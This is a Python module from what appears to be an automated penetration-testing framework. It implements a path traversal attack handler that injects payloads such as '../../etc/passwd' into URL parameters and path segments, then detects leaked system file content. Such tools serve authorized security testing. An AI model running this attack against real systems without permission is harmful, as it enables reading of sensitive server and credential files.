"""Path traversal attack handler.

Injects directory traversal payloads (``../../etc/passwd``) into URL
parameters and path segments, then inspects the response for indicators
that a local file was read successfully.
"""

from __future__ import annotations

import re
from urllib.parse import urlencode

import requests

from src.executor.base import AttackHandler
from src.infra.decorators import retry
from src.infra.logging import get_logger
from src.models import AttackVector, SingleAttackResult

logger = get_logger(__name__)

# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

_LINUX_PATTERNS: list[re.Pattern] = [
    re.compile(r"root:.*:0:0:"),  # /etc/passwd
    re.compile(r"/bin/(ba)?sh"),
    re.compile(r"/etc/passwd"),
]

_WINDOWS_PATTERNS: list[re.Pattern] = [
    re.compile(r"\[boot loader\]", re.IGNORECASE),
    re.compile(r"\[operating systems\]", re.IGNORECASE),
    re.compile(r"\\Windows\\", re.IGNORECASE),
]

_PATH_LEAKED_PATTERN = re.compile(
    r"(No such file|Permission denied|cannot access|failed to open).*[/\\]",
    re.IGNORECASE,
)


class PathTraversalHandler(AttackHandler):
    """Test path traversal by injecting file-path payloads.

    1. Inject the payload into each URL query parameter.
    2. If the endpoint has file-like parameter names, also try the
       payload as a path segment.
    3. Check the response body for OS file content or partial path
       leaks in error messages.
    """

    attack_type = "path_traversal"

    _FILE_PARAM_HINTS = frozenset(
        {
            "file",
            "filename",
            "path",
            "filepath",
            "page",
            "document",
            "doc",
            "folder",
            "dir",
            "template",
            "include",
            "load",
        }
    )

    # ------------------------------------------------------------------
    # helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _detect_file_content(body: str) -> tuple[bool, str]:
        """Return ``(success, detection_method)`` based on body content."""
        for pat in _LINUX_PATTERNS:
            if pat.search(body):
                return True, "Linux file content detected in response (e.g. /etc/passwd)"

        for pat in _WINDOWS_PATTERNS:
            if pat.search(body):
                return True, "Windows file content detected in response (e.g. boot.ini)"

        if _PATH_LEAKED_PATTERN.search(body):
            return False, "Partial traversal: error message reveals internal file path"

        return False, "No file content indicators found in response"

    def _inject_in_params(
        self,
        endpoint: str,
        fields: list[str],
        payload: str,
    ) -> str:
        """Build a URL with *payload* injected into query parameters."""
        params = {f: payload for f in fields} if fields else {"file": payload}
        sep = "&" if "?" in endpoint else "?"
        return f"{endpoint}{sep}{urlencode(params)}"

    def _has_file_params(self, fields: list[str]) -> bool:
        """Return True if any field name hints at a file-path parameter."""
        return bool(set(f.lower() for f in fields) & self._FILE_PARAM_HINTS)

    # ------------------------------------------------------------------
    # public API
    # ------------------------------------------------------------------

    @retry(max_attempts=2, base_delay=0.5, exceptions=(requests.ConnectionError, requests.Timeout))
    def test(self, vector: AttackVector, payload: str) -> SingleAttackResult:
        """Execute a path traversal test against the target endpoint."""
        endpoint = vector.target_endpoint
        fields = vector.target_fields
        logger.debug("[PATH_TRAVERSAL] %s <- %s", endpoint, payload)

        # --- Strategy 1: inject payload into URL query parameters ---
        target_url = self._inject_in_params(endpoint, fields, payload)

        try:
            resp = self.session.get(target_url)
        except requests.RequestException as exc:
            logger.error("Request failed for path traversal: %s", exc)
            return self._make_result(
                vector,
                payload,
                status=0,
                snippet=str(exc),
                success=False,
                detection=f"Connection error: {exc}",
            )

        if resp is None:
            return self._make_result(
                vector,
                payload,
                status=0,
                snippet="No response received",
                success=False,
                detection="Connection error: no response from target",
            )

        body = resp.text
        snippet = body[:200]
        success, detection = self._detect_file_content(body)

        if success:
            logger.info(
                "[PATH_TRAVERSAL] SUCCESS on %s | %s",
                endpoint,
                detection,
            )
            return self._make_result(
                vector,
                payload,
                status=resp.status_code,
                snippet=snippet,
                success=True,
                detection=detection,
            )

        # --- Strategy 2: try payload as path segment (file-like params) ---
        if self._has_file_params(fields):
            path_url = f"{endpoint}/{payload}"
            try:
                resp2 = self.session.get(path_url)
            except requests.RequestException:
                resp2 = None

            if resp2 is not None:
                body2 = resp2.text
                success2, detection2 = self._detect_file_content(body2)
                if success2 or "Partial" in detection2:
                    logger.info(
                        "[PATH_TRAVERSAL] %s on %s (path segment) | %s",
                        "SUCCESS" if success2 else "PARTIAL",
                        endpoint,
                        detection2,
                    )
                    return self._make_result(
                        vector,
                        payload,
                        status=resp2.status_code,
                        snippet=body2[:200],
                        success=success2,
                        detection=detection2,
                    )

        # --- Strategy 3: check for abnormal response length / content-type ---
        content_type = resp.headers.get("Content-Type", "")
        if resp.status_code == 200 and len(body) > 5000 and "html" not in content_type.lower():
            detection = (
                "Suspiciously large response with non-HTML content-type after traversal payload"
            )
            logger.info("[PATH_TRAVERSAL] SUSPICIOUS on %s | %s", endpoint, detection)
            return self._make_result(
                vector,
                payload,
                status=resp.status_code,
                snippet=snippet,
                success=True,
                detection=detection,
            )

        # --- no traversal detected ---
        logger.debug("[PATH_TRAVERSAL] FAIL on %s | %s", endpoint, detection)
        return self._make_result(
            vector,
            payload,
            status=resp.status_code,
            snippet=snippet,
            success=False,
            detection=detection,
        )
